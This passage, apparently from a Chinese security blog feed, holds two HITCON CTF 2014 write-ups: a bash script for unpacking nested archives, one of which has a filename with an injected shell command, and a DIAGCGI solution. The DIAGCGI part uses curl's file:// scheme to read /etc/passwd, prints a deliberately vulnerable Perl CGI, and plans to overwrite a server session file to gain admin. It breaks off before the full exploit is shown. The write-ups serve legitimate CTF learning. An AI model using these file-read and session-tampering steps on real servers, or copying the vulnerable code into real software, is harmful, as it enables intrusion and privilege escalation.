<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>此题附件为一个zip压缩包，下载之。</p>
<p>粗看以为是一个循环压缩包（即压缩包里面套压缩包：1024.zip-&gt;1023.zip-&gt;1022.zip-&gt;….），心里一乐，辣么简单的题目就能赚辣么多分，好开森~~于是写了一个循环解压的python脚本，之后跑了一下，突然……T^T，发现后面有tar.gz之类的其他类型压缩包。</p>
<p>无奈，切换到linux下，操刀shell。思路还是和一开始一样，判断扩展名，之后根据类型解压即可。代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">if [ &quot;$&#123;filename##*.&#125;&quot; = &quot;gz&quot; ]; then</div><div class="line">	tar -zxf $&#123;filename&#125;</div><div class="line">elif [ &quot;$&#123;filename##*.&#125;&quot; = &quot;bz2&quot; ]; then</div><div class="line">	tar -jxf $&#123;filename&#125;</div><div class="line">elif [ &quot;$&#123;filename##*.&#125;&quot; = &quot;Zip&quot; ]; then</div><div class="line">	unzip $&#123;filename&#125;</div><div class="line">fi</div></pre></td></tr></table></figure></p>
<p>本以为这题就crack了，but……又有情况出现，出现了没有扩展名的压缩包（重度Windows用户真心依赖扩展名）。于是修改代码，利用file判断文件类型，再分类解压。</p>
<p>这样程序大致雏形完成，不过其中出现了很多畸形压缩包，由于竞赛时间有限，并没有写出一个完善的shell的策略，而是采用手工修改畸形压缩包的办法完成占比例不算太大的畸形压缩包（大概10几个吧）。</p>
<p>其中出现的畸形文件大致有这么几类：</p>
<ol>
<li>普通畸形文件名</li>
<li>掺杂有shell脚本的畸形文件名，如：672; while true; do; done</li>
<li>UTF-8编码的畸形文件名</li>
<li>连续嵌套的文件夹（解压后有产生有一定深度的文件夹，文件被放在最里面的文件夹中）</li>
<li>解压后文件夹与文件名同名情况（无法拷贝到同一层目录）<br>6.解压后不只一个文件，还存在其他文件夹（同目录级别）</li>
<li>貌似还有一些，没仔细统计……</li>
<li>整个解题的shell脚本非常简单，但写的比较丑，就不给出了。</li>
</ol>
<h3 id="改进的解题脚本"><a href="#改进的解题脚本" class="headerlink" title="改进的解题脚本"></a>改进的解题脚本</h3><p>不过采用“基本靠脚本，偶尔靠人手的办法”，虽然拿到了最终的flag，总有些不完美，这里给出后来修改过的shell，直接一键解到flag。</p>
<p>首先粗略介绍一下脚本原理：</p>
<ol>
<li>对解压后获得的有效文件夹及有效文件（所谓有效文件即目标文件，而不是那些用来迷惑的文件夹或文件）改名，防止因为文件名问题（如重名，畸形文件名等）造成无法解压。</li>
<li>根据文件类型解压，并进入下一轮。</li>
</ol>
<p>该脚本使用方法：</p>
<ol>
<li>假设目前所在工作目录为/home/yyx/CTF</li>
<li>将脚本<code>zip.sh</code>放在CTF目录下</li>
<li>创建zip目录</li>
<li>在zip目录中创建f_1024</li>
<li>将下载回来的zip放入f_1024中并改名ff_1024</li>
<li>cd到工作目录，并执行<code>./zip.sh</code></li>
</ol>
<p>初始工作目录如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">/home/yyx/CTF</div><div class="line">├── zip</div><div class="line">│ └── f_1024</div><div class="line">│      └── ff_1024</div><div class="line">└── zip.sh</div></pre></td></tr></table></figure></p>
<p>脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line"></div><div class="line">num=1024</div><div class="line">rootpath=&apos;/home/yyx/CTF/zip&apos;</div><div class="line">folder=&quot;f_$&#123;num&#125;&quot;</div><div class="line">filename=&quot;ff_$&#123;num&#125;&quot;</div><div class="line"></div><div class="line">while [ $num -gt -1 ]; do</div><div class="line"></div><div class="line">	cd  $&#123;rootpath&#125;/$&#123;folder&#125;</div><div class="line"></div><div class="line">	#change file path</div><div class="line">	mv $&#123;rootpath&#125;/$&#123;folder&#125;/$&#123;filename&#125; $&#123;rootpath&#125;/$&#123;filename&#125;</div><div class="line">	</div><div class="line">	#get file type</div><div class="line">	filetype=$(file $&#123;rootpath&#125;/$&#123;filename&#125; | awk &apos;&#123;print $2&#125;&apos;)</div><div class="line">	</div><div class="line">	#unpack file</div><div class="line">	cd $&#123;rootpath&#125;</div><div class="line">	if [ &quot;$&#123;filetype&#125;&quot; = &quot;gzip&quot; ]; then</div><div class="line">		tar -zxf $&#123;filename&#125;</div><div class="line">	elif [ &quot;$&#123;filetype&#125;&quot; = &quot;bzip2&quot; ]; then</div><div class="line">		tar -jxf $&#123;filename&#125;</div><div class="line">	elif [ &quot;$&#123;filetype&#125;&quot; = &quot;Zip&quot; ]; then</div><div class="line">		unzip $&#123;filename&#125;</div><div class="line">	else</div><div class="line">		echo &quot;sth new :(&quot;</div><div class="line">		break</div><div class="line">	fi</div><div class="line"></div><div class="line">	#delete old files &amp; folders</div><div class="line">	rm $&#123;rootpath&#125;/$&#123;filename&#125;</div><div class="line">	rm -rf $&#123;rootpath&#125;/$&#123;folder&#125;</div><div class="line">	</div><div class="line">	#update name of folder and file</div><div class="line">	num=$(( $num - 1 ))</div><div class="line">	folder=&quot;f_$&#123;num&#125;&quot;</div><div class="line">	filename=&quot;ff_$&#123;num&#125;&quot;</div><div class="line"></div><div class="line">	#change folder name</div><div class="line">	cd $&#123;rootpath&#125;	</div><div class="line">	newfolder=$(ls -l ./ | grep ^d | awk &apos;&#123;print $9&#125;&apos;)</div><div class="line">	mv &quot;$&#123;rootpath&#125;/$&#123;newfolder&#125;&quot; &quot;$&#123;rootpath&#125;/$&#123;folder&#125;&quot;</div><div class="line">	</div><div class="line">	#get file name</div><div class="line">	cd $&#123;rootpath&#125;/$&#123;folder&#125;</div><div class="line">	newfile=$(ls -l ./ | grep ^- | awk &apos;&#123;for(i=9;i&lt;NF;i++) printf $i&quot; &quot;&#125;&#123;print $NF&#125;&apos;)</div><div class="line">	#hack for nested folders</div><div class="line">	while [ &quot;$&#123;newfile&#125;&quot; = &quot;&quot; ]; do</div><div class="line">		tmp=&quot;$(ls -l ./ | grep ^d | awk &apos;&#123;print $9&#125;&apos;)&quot;</div><div class="line">		cd $tmp</div><div class="line">		newfile=$(ls -l ./ | grep ^- | awk &apos;&#123;for(i=9;i&lt;NF;i++) printf $i&quot; &quot;&#125;&#123;print $NF&#125;&apos;)</div><div class="line">	done</div><div class="line">	#change file name</div><div class="line">	curr=$(pwd)</div><div class="line">	mv &quot;$&#123;curr&#125;/$&#123;newfile&#125;&quot; &quot;$&#123;rootpath&#125;/$&#123;folder&#125;/$&#123;filename&#125;&quot;</div><div class="line">done</div></pre></td></tr></table></figure></p>
<p>最后拿到flag为<code>HITCON{SO0O0OO_MaNy_7Ar_Le\/eLs}</code>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Tarmful&quot;&gt;&lt;a href=&quot;#Tarmful&quot; class=&quot;headerlink&quot; title=&quot;Tarmful&quot;&gt;&lt;/a&gt;Tarmful&lt;/h1&gt;&lt;p&gt;Description&lt;br&gt;Just decompress them all.&lt;br&gt;&lt;a hre
    
    </summary>
    
      <category term="CTF" scheme="http://blog.watch0ut.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blog.watch0ut.com/tags/CTF/"/>
    
      <category term="Misc" scheme="http://blog.watch0ut.com/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>HITCON CTF 2014 DIAGCGI Write-up</title>
    <link href="http://blog.watch0ut.com/2014/08/22/HITCON-CTF-2014-DIAGCGI-Write-up/"/>
    <id>http://blog.watch0ut.com/2014/08/22/HITCON-CTF-2014-DIAGCGI-Write-up/</id>
    <published>2014-08-22T13:57:00.000Z</published>
    <updated>2015-11-15T14:23:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DIAGCGI"><a href="#DIAGCGI" class="headerlink" title="DIAGCGI"></a>DIAGCGI</h1><p>Description<br><a href="http://54.92.127.128:16888/" target="_blank" rel="external">http://54.92.127.128:16888/</a></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>没有提示，打开连接自动跳转到：<a href="http://54.92.127.128:16888/cgi-bin/dana-na.cgi?sechash=" target="_blank" rel="external">http://54.92.127.128:16888/cgi-bin/dana-na.cgi?sechash=</a></p>
<p>输入任意网址，比如watch0ut.com测试，发现curl可以直接获取网页源码。试试获取服务器系统文件呢？直接输入/etc/passwd,返回空白。改个方式：file:///ect/passwd，果然可以直接读取系统文件！</p>
<p>看看有哪些用户：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div><div class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</div><div class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</div><div class="line">sync:x:4:65534:sync:/bin:/bin/sync</div><div class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</div><div class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</div><div class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</div><div class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</div><div class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</div><div class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</div><div class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</div><div class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div><div class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</div><div class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</div><div class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</div><div class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</div><div class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</div><div class="line">libuuid:x:100:101::/var/lib/libuuid:</div><div class="line">syslog:x:101:104::/home/syslog:/bin/false</div><div class="line">messagebus:x:102:106::/var/run/dbus:/bin/false</div><div class="line">landscape:x:103:109::/var/lib/landscape:/bin/false</div><div class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</div><div class="line">pollinate:x:105:1::/var/cache/pollinate:/bin/false</div><div class="line">ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash</div><div class="line">key:x:1001:1001::/home/key:</div></pre></td></tr></table></figure></p>
<p>有个用户叫key？！哈哈，莫非是暗示:D<br>key应该就在该用户目录下吧，尝试读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">file:///home/key/key</div><div class="line">file:///home/key/flag</div><div class="line">file:///home/key/flag.key</div><div class="line">file:///home/key/DIAGCGI</div></pre></td></tr></table></figure></p>
<p>等等情况，失败。看来猜文件名方式不靠谱，如果能ls看看目录有啥文件就好了……<br>看看网页源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;STYLE TYPE=&quot;text/css&quot;&gt; </div><div class="line">&lt;!-- </div><div class="line">  @import url(http://bootswatch.com/spacelab/bootstrap.min.css); </div><div class="line">--&gt; </div><div class="line">&lt;/STYLE&gt;</div><div class="line">&lt;title&gt; simple diagnostic cgi&lt;/title&gt;</div><div class="line">&lt;center&gt;</div><div class="line">&lt;h1&gt; simple &lt;font color=red&gt;diag&lt;/font&gt;nostic cgi&lt;/h1&gt;</div><div class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</div><div class="line">&lt;input type=&quot;name&quot; name=&quot;arg&quot; value=&quot;&quot;&gt;&lt;br /&gt;</div><div class="line">&lt;input name=&quot;action&quot; type=&quot;submit&quot; value=&quot;ping&quot;&gt;</div><div class="line">&lt;input name=&quot;action&quot; type=&quot;submit&quot; value=&quot;traceroute&quot;&gt;</div><div class="line">&lt;input name=&quot;action&quot; type=&quot;submit&quot; value=&quot;curl&quot;&gt;</div><div class="line">&lt;!-- &lt;input name=&quot;action&quot; type=&quot;submit&quot; value=&quot;shell&quot;&gt; --&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure></p>
<p>有个表单参数被隐藏了，从名字看，应该可以通过shell执行命令吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;input name=&quot;action&quot; type=&quot;submit&quot; value=&quot;shell&quot; /&gt;</div></pre></td></tr></table></figure></p>
<p>使用burp修改下请求数据，把value修改为shell，参数为<code>ls</code>。<br>返回：`sorry guest! you’re not admin!``</p>
<p>输入任何命令，包括错误的命令，提示相同，猜测这里应该是个提示，获取admin权限。</p>
<h2 id="获取页面源码"><a href="#获取页面源码" class="headerlink" title="获取页面源码"></a>获取页面源码</h2><p>又被迫回到上面的思路，curl查看源文件。继续猜下dana-na.cgi文件目录，如果能查看网页源码，就好办了。<br>队友很快猜到了网页路径：<code>/usr/lib/cgi-bin/dana-na.cgi</code><br>输入：<code>file:///usr/lib/cgi-bin/dana-na.cgi</code><br>获取网页源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/perl -w</div><div class="line"></div><div class="line">use CGI;</div><div class="line">use Digest::MD5 qw(md5_hex);</div><div class="line"></div><div class="line">$cgi = new CGI;</div><div class="line">$SESSDIR = &quot;/tmp/&quot;;</div><div class="line">$sessfile = $cgi-&gt;cookie(&quot;diagsess&quot;);</div><div class="line">$arg0 = $cgi-&gt;param(&quot;arg&quot;);</div><div class="line">$action = $cgi-&gt;param(&quot;action&quot;);</div><div class="line">$arg = &amp;safestr($arg0);</div><div class="line"></div><div class="line">if (! defined($sessfile) )</div><div class="line">&#123;</div><div class="line">	if ( md5_hex($cgi-&gt;param(&quot;sechash&quot;)) =~ /^000000000000.*$/)</div><div class="line">	&#123;</div><div class="line">		$sesshash&#123;&apos;user&apos;&#125; = &apos;admin&apos;;</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		$sesshash&#123;&apos;user&apos;&#125;  = &apos;guest&apos;;</div><div class="line">	&#125;</div><div class="line">	$sesshash&#123;&apos;ip&apos;&#125; = &amp;get_ip;</div><div class="line"></div><div class="line">	$diagsess = md5_hex( $sesshash&#123;&apos;user&apos;&#125; . &apos;|||&apos; . $sesshash&#123;&apos;ip&apos;&#125; );</div><div class="line">	$cookie = &quot;diagsess=$diagsess;&quot;;</div><div class="line">	&amp;write_session;</div><div class="line">	print $cgi-&gt;header(-cookie =&gt; $cookie,</div><div class="line">			-expires =&gt; &apos;Mon, 01 Jan 1999 00:00:00 GMT&apos;,</div><div class="line">			-&apos;cache-control&apos; =&gt; &apos;no-cache&apos;,</div><div class="line">			-pragma =&gt; &apos;no-cache&apos;,-&apos;location&apos;=&gt; &apos;dana-na.cgi?sechash=&apos; );</div><div class="line"></div><div class="line">	exit 0;</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">	print $cgi-&gt;header();</div><div class="line">	&amp;read_session;</div><div class="line">	&amp;print_menu;</div><div class="line">&#125;</div><div class="line">if (defined ($action) &amp;&amp; length($action)&gt;0)</div><div class="line">&#123;</div><div class="line">	if ($action =~ /^print_session$/)</div><div class="line">	&#123;</div><div class="line">		&amp;print_session;</div><div class="line">		exit 0;</div><div class="line">	&#125;</div><div class="line">	if ($action =~ /^curl$/)</div><div class="line">	&#123;</div><div class="line">		&amp;curl($arg);</div><div class="line">		exit 0;</div><div class="line">	&#125;</div><div class="line">	if ($action =~ /^ping$/ )</div><div class="line">	&#123;</div><div class="line">		&amp;ping($arg);</div><div class="line">		exit 0;</div><div class="line">	&#125;</div><div class="line">	if ($action =~ /^traceroute$/)</div><div class="line">	&#123;</div><div class="line">		&amp;traceroute ($arg);</div><div class="line">		exit 0;</div><div class="line">	&#125;</div><div class="line">	if ($action =~ /^shell$/)</div><div class="line">	&#123;</div><div class="line">		&amp;shell($arg);</div><div class="line">		exit 0;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">sub curl</div><div class="line">&#123;</div><div class="line">	$host = shift;</div><div class="line">	print &quot;&lt;pre&gt;&lt;textarea rows=24 cols=80&gt;&quot;;</div><div class="line">	if (defined($host) &amp;&amp; length($host)&gt;1)</div><div class="line">	&#123;</div><div class="line">		open(GG,&quot;/usr/bin/curl -s $host |&quot;) and do</div><div class="line">		&#123;</div><div class="line">			while(&lt;GG&gt;)</div><div class="line">			&#123;</div><div class="line">				print;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">sub ping</div><div class="line">&#123;</div><div class="line">	my $host = shift;</div><div class="line">	print &quot;&lt;pre&gt;&quot;;</div><div class="line">	if(defined($host) &amp;&amp; length($host)&gt;1)</div><div class="line">	&#123;</div><div class="line">		open(GG,&quot;/bin/ping -c3 $host |&quot;) and do </div><div class="line">		&#123;</div><div class="line">			while(&lt;GG&gt;)</div><div class="line">			&#123;</div><div class="line"></div><div class="line">				print;</div><div class="line">			&#125;</div><div class="line"></div><div class="line">		&#125;; </div><div class="line">		close GG;</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">sub traceroute </div><div class="line">&#123;</div><div class="line">	my $host = shift;</div><div class="line">	print &quot;&lt;pre&gt;&quot;;</div><div class="line">	if(defined($host) &amp;&amp; length($host)&gt;1)</div><div class="line">	&#123;</div><div class="line">		open(GG,&quot;/usr/sbin/traceroute -d -n -w 5 $host |&quot;) and do</div><div class="line">		&#123;</div><div class="line">			while(&lt;GG&gt;)</div><div class="line">			&#123;</div><div class="line">				print;</div><div class="line">			&#125;</div><div class="line"></div><div class="line">		&#125;;</div><div class="line">		close GG;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">sub read_session</div><div class="line">&#123;</div><div class="line">	undef %sesshash;</div><div class="line">	if(! -f &quot;$SESSDIR/$sessfile&quot;)</div><div class="line">	&#123;</div><div class="line">		print &quot;session error!&quot;;</div><div class="line">		return;</div><div class="line">	&#125;</div><div class="line">	open(GG, &quot;$SESSDIR/$sessfile&quot;) and do &#123;</div><div class="line">		while (&lt;GG&gt;) &#123;</div><div class="line">			eval($_);</div><div class="line">		&#125;</div><div class="line">		close GG;</div><div class="line">	&#125;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">sub write_session</div><div class="line">&#123;</div><div class="line">	open(GG, &quot;&gt;$SESSDIR/$diagsess&quot;) and do</div><div class="line">	&#123;</div><div class="line">		foreach (sort keys %sesshash)</div><div class="line">		&#123;</div><div class="line">			print GG &quot;\$sesshash&#123;&apos;$_&apos;&#125; = &apos;$sesshash&#123;$_&#125;&apos;;\n&quot;;</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">	close GG;</div><div class="line">&#125;</div><div class="line"></div><div class="line">sub print_session</div><div class="line">&#123;</div><div class="line">	foreach (sort keys %sesshash) &#123;</div><div class="line">		print &quot;$_=$sesshash&#123;$_&#125;\n&quot;;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">sub shell</div><div class="line">&#123;</div><div class="line">	$cmd = shift;</div><div class="line">	print &quot;&lt;pre&gt;&quot;;</div><div class="line">	if (  $sesshash&#123;&apos;user&apos;&#125; eq &apos;admin&apos; ) </div><div class="line">	&#123;</div><div class="line">		open(GG, &quot;$cmd |&quot;) and do</div><div class="line">		&#123;</div><div class="line">			print;</div><div class="line">		&#125;;</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		print &quot;sorry $sesshash&#123;&apos;user&apos;&#125;! you&apos;re not admin!\n&quot;;</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">sub print_menu</div><div class="line">&#123;</div><div class="line">	$arg0 =~ s/\&lt;/\&lt;\;/g;</div><div class="line">	open(GG,&quot;cat menu.html |&quot;) and do</div><div class="line">	&#123;</div><div class="line">		while(&lt;GG&gt;)</div><div class="line">		&#123;</div><div class="line">			$_ =~ s/\%\%arg\%\%/$arg0/g;	</div><div class="line">			print $_;</div><div class="line">		&#125;</div><div class="line">		close GG;</div><div class="line">	&#125;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">sub get_ip</div><div class="line">&#123;</div><div class="line">	$h1 = $ENV&#123;&apos;REMOTE_ADDR&apos;&#125;;</div><div class="line">	$h2 = $ENV&#123;&apos;HTTP_CLIENT_IP&apos;&#125;;</div><div class="line">	$h3 = $ENV&#123;&apos;HTTP_X_FORWARDED_FOR&apos;&#125;;</div><div class="line"></div><div class="line">	if (length($h3)&gt;0)</div><div class="line">	&#123;</div><div class="line">		return $h3;</div><div class="line">	&#125;</div><div class="line">	elsif (length($h2)&gt;0)</div><div class="line">	&#123;</div><div class="line">		return $h2;</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		return $h1;</div><div class="line">	&#125;</div><div class="line">	return &quot;UNKNOWN&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">sub safestr</div><div class="line">&#123;</div><div class="line">	my $str = shift;</div><div class="line"></div><div class="line">	$str =~  s/([;&lt;&gt;\*\|`&amp;\$!#\(\)\[\]\&#123;\&#125;:&apos;&quot;])/\\$1/g;;</div><div class="line">	return $str;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>获取admin权限代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">if ( md5_hex($cgi-&gt;param(&quot;sechash&quot;)) =~ /^000000000000.*$/)</div><div class="line">&#123;</div><div class="line">    $sesshash&#123;&apos;user&apos;&#125; = &apos;admin&apos;;</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">    $sesshash&#123;&apos;user&apos;&#125;  = &apos;guest&apos;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>sechash参数md5值前12位都是0，are you kidding me?这又是出题者估计设计的陷阱。</p>
<p>往下看，只有第一次访问时候，没生成cookie才会进入admin判断逻辑，并将权限写入session文件。后面直接从session读取。也就是我们可以直接修改服务器session文件提权。</p>
<h2 id="session文件提权"><a href="#session文件提权" class="headerlink" title="session文件提权"></a>session文件提权</h2><p>先读取下服务器上自己的session，网页先查看自己的cookie值，比如：aaebc6da0de8cf02b348c8eb4a3f585f<br>通过<code>file:///tmp/aaebc6da0de8cf02b348c8eb4a3f585f</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$sesshash&#123;&apos;ip&apos;&#125; = &apos;21.194.11.***&apos;;</div><div class="line">$sesshash&#123;&apos;user&apos;&#125; = &apos;guest&apos;;</div></pre></td></tr></table></figure></p>
<p>查询curl参数，-o可以直接指定输出文件，于是，自己写一个文件test.txt，上传到自己的空间：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$sesshash&#123;&apos;ip&apos;&#125; = &apos;21.194.11.***&apos;;</div><div class="line">$sesshash&#123;&apos;user&apos;&#125; = &apos;admin&apos;;</div></pre></td></tr></table></figure></p>
